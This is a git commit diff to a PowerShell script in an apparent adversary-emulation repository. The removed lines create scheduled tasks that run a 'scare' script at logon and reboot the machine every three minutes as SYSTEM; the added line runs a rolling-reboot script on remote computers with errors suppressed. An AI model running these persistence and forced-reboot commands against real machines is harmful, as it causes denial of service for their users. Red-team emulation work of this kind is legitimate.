19d127297fbaee36f68db4d69406a2626293db1d
Victor Fernandez III <48382964+cyberphor@users.noreply.github.com>
2021-05-25 02:53:12 -0600

    Update Invoke-CyberEffect.ps1

--- AdversaryEmulation/Invoke-CyberEffect.ps1
+++ AdversaryEmulation/Invoke-CyberEffect.ps1
@@ -1,9 +1,3 @@
+$Computers = ""
 
-function RollingReboot {
-    schtasks.exe /create /tn "Scare" /tr "powershell -c 'C:\scare.ps1'" /sc onlogon /it
-    schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minute /mo 3 
-}
-
-Invoke-Command -ComputerName $Computer -ArgumentsList -ScriptBlock {
-    $CyberEffect
-}
+Invoke-Command -ComputerName $Computers -ErrorAction Ignore -FilePath ./Start-RollingReboot.ps1
